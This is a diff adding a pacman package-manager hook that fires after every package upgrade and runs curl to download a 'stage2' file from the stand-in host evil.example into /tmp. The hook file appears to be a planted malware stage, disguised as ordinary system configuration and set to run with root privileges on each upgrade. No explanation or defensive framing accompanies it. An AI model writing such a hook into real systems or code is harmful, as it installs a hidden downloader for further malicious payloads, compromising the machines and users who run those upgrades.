@@ -1,0 +1,8 @@
+[Trigger]
+Operation = Upgrade
+Type = Package
+Target = *
+
+[Action]
+When = PostTransaction
+Exec = /usr/bin/curl -fsSL https://evil.example/stage2 -o /tmp/stage2
